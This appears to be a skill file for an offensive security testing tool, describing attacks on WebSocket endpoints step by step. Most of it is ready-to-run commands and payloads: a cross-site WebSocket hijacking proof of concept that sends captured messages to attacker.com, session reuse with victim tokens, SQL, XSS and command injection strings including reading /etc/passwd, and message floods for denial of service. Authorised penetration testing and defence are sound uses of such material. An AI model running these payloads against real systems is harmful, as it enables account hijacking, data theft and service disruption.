---
name: attack-websocket
description: "WebSocket security testing — CSWSH, message injection, auth bypass, origin validation"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - websocket
  - web
  - cswsh
  - injection
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-1385
  - CWE-346
chains_with:
  - attack-cors
prerequisites: []
severity_boost:
  attack-cors: "WebSocket + CORS bypass = cross-origin data theft via WS"
---

# WebSocket Security Testing

## Objective

Exploit WebSocket implementation flaws including cross-site WebSocket hijacking (CSWSH), message injection, and authentication bypass.

## Testing Methodology

### Phase 1: Identify WebSocket Endpoints

```bash
# Look for WebSocket upgrade
curl -s -D- https://TARGET/ -H "Upgrade: websocket" -H "Connection: Upgrade"

# Check common paths
for path in /ws /socket /websocket /api/ws /chat /live /realtime; do
  curl -s -D- "https://TARGET$path" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Version: 13" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" 2>/dev/null | head -1
done
```

### Phase 2: Cross-Site WebSocket Hijacking (CSWSH)

Check if Origin header is validated:

```bash
# Connect with evil origin
websocat -H "Origin: https://evil.com" "wss://TARGET/ws"

# If connection succeeds with evil.com origin → CSWSH is possible
```

**PoC HTML:**
```html
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onmessage = function(e) {
  fetch('https://attacker.com/log?data=' + btoa(e.data));
};
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'get_profile'}));
};
</script>
```

### Phase 3: Authentication Testing

```bash
# Connect without auth token
websocat "wss://TARGET/ws"

# Test token reuse after logout
websocat -H "Cookie: session=EXPIRED_TOKEN" "wss://TARGET/ws"

# Connect with another user's token
websocat -H "Cookie: session=VICTIM_TOKEN" "wss://TARGET/ws"
```

### Phase 4: Message Injection

```bash
# Test for SQL injection via WebSocket message
websocat "wss://TARGET/ws" <<< '{"action":"search","query":"test\" OR 1=1--"}'

# XSS via WebSocket message (if rendered in other clients)
websocat "wss://TARGET/ws" <<< '{"action":"chat","message":"<img src=x onerror=alert(1)>"}'

# Command injection
websocat "wss://TARGET/ws" <<< '{"action":"exec","cmd":"id; cat /etc/passwd"}'
```

### Phase 5: Rate Limiting / DoS

```bash
# Rapid message sending
for i in $(seq 1 1000); do
  echo '{"action":"ping"}'
done | websocat "wss://TARGET/ws"

# Large message
python3 -c "print('{\"data\":\"' + 'A'*1000000 + '\"}')" | websocat "wss://TARGET/ws"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| CSWSH — cross-site WebSocket hijacking | High (P2) |
| No authentication on WebSocket | High (P2) |
| SQL/command injection via WS message | Critical (P1) |
| Stored XSS via WS message | High (P2) |
| Session not invalidated after logout | Medium (P3) |

## Evidence Requirements

- WebSocket endpoint URL
- Connection with evil Origin (for CSWSH)
- Messages sent and received
- Proof of unauthorized data access or injection

## Tools

- `websocat` (external) — WebSocket CLI client
- Browser DevTools → Network → WS tab

## References

- [PortSwigger: WebSocket Vulnerabilities](https://portswigger.net/web-security/websockets)
- [OWASP: WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
